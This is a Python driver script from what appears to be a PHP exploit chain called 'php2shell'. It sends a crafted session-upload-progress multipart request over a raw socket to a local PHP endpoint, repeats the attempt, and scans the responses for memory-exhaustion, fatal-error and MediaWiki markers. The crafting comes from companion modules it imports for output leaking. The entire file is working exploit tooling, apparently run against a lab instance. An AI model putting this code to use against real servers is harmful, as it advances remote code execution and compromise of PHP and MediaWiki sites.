#!/usr/bin/env python3
"""Consumer driver: single native STOCK arm request (session upload progress multipart).

Shape per php2shell.py:attempt(): arm_body = STOCK.arm_body(b"abcdefgh", L)
framed by LEAK.request_bytes(host_header, path, body, None, 23, False)
(no Cookie header; sid travels as PHPSESSID form field; Basic auth user len 23;
 Connection: close).
"""
import hashlib
import importlib.util
import json
import socket
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent


def load(name, rel):
    spec = importlib.util.spec_from_file_location(name, HERE / rel)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


LEAK = load("leak", "native-output-leak.py")
STOCK = load("stock", "native-output-leak-stock-arm.py")
COMPACT = load("compact", "compact-stock-tail.py")

FL = COMPACT.ARM_FILENAME_LENGTH
HOST, PORT = "127.0.0.1", 28840
PATH = "/index.php"
HH = "127.0.0.1:28840"


def one_arm(timeout=50.0, ordinary=False):
    body = STOCK.arm_body(b"abcdefgh", FL)
    request = LEAK.request_bytes(HH, PATH, body, None, 23, False)
    body_len = len(body)
    conn = None
    err = None
    t0 = time.time()
    status = hdrs = resp = dec = None
    try:
        conn = socket.create_connection((HOST, PORT), timeout=timeout)
        conn.settimeout(timeout)
        stream = conn.makefile("rb", buffering=0)
        conn.sendall(request)
        resp, dec, hdrs, status = LEAK.read_response(stream)
    except Exception as e:
        err = f"{type(e).__name__}: {e}"
    finally:
        if conn is not None:
            try:
                conn.close()
            except OSError:
                pass
    dt = round(time.time() - t0, 3)
    rec = {
        "arm_body_bytes": len(body),
        "request_bytes": len(request),
        "elapsed_s": dt,
        "error": err,
        "status": status,
        "hdr_connection": (hdrs or {}).get("connection", ""),
        "resp_bytes": len(resp) if resp is not None else None,
        "body_bytes": len(dec) if dec is not None else None,
        "body_sha12": hashlib.sha256(dec).hexdigest()[:12] if dec is not None else None,
        "markers": {
            m.decode(): (m in dec)
            for m in (
                b"Allowed memory",
                b"Unknown on line 0",
                b"Fatal error",
                b"upload_progress",
                b"MediaWiki",
            )
        }
        if dec is not None else None,
    }
    return rec, resp, dec


if __name__ == "__main__":
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 1
    spacing = float(sys.argv[2]) if len(sys.argv) > 2 else 1.0
    outdir = Path(sys.argv[3]) if len(sys.argv) > 3 else HERE / "cons"
    outdir.mkdir(parents=True, exist_ok=True)
    results = []
    for i in range(1, n + 1):
        rec, resp, dec = one_arm()
        (outdir / f"arm-{i}-response.bin").write_bytes(resp or b"")
        (outdir / f"arm-{i}-body.bin").write_bytes(dec or b"")
        print(json.dumps(rec, sort_keys=True), flush=True)
        results.append(rec)
        if i != n and spacing > 0:
            time.sleep(spacing)
    (outdir / "arm_summary.json").write_text(json.dumps(results, indent=1, sort_keys=True))
